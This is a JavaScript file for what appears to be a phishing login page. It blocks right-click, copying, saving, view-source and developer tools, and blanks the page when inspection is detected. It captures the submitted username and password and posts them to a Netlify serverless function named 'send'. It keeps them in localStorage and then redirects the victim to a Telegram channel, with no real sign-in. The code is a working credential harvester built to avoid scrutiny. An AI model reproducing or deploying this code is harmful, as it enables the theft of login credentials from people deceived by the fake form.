let sentData = JSON.parse(localStorage.getItem('sentData')) || [];

document.addEventListener('contextmenu', event => event.preventDefault());

document.addEventListener('keydown', function (event) {
    if ((event.ctrlKey || event.metaKey) && event.key === 's') {
        event.preventDefault();
    }

    if ((event.ctrlKey || event.metaKey) && event.key === 'u') {
        event.preventDefault();
    }

    if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.key === 'i' || event.key === 'F12') {
        event.preventDefault();
    }

    if ((event.ctrlKey || event.metaKey) && event.key === 'c') {
        event.preventDefault();
    }

    if (event.key === 'PrintScreen') {
        event.preventDefault();
    }
});

document.addEventListener('dragstart', function (event) {
    event.preventDefault();
});

function detectDevTools() {
    const threshold = 160;

    const checkDevTools = () => {
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        if (widthThreshold || heightThreshold) {
            document.body.innerHTML = 'الوصول مرفوض!';
        }
    };

    window.addEventListener('resize', checkDevTools);
    setInterval(checkDevTools, 1000);
}

detectDevTools();

document.addEventListener('DOMContentLoaded', function () {

    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        const userInput = document.getElementById('userInput').value.trim();
        const password = document.getElementById('password').value.trim();

        const isDuplicate = sentData.some(data =>
            data.user === userInput && data.pass === password
        );

        if (isDuplicate) {
            window.location.href = "https://t.me/HapyCode";
            return;
        }

        fetch('/.netlify/functions/send', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                text: userInput,
                password: password
            })
        })
            .then(response => {
                sentData.push({ user: userInput, pass: password });
                localStorage.setItem('sentData', JSON.stringify(sentData));
                window.location.href = "https://t.me/HapyCode";
            })
    });
});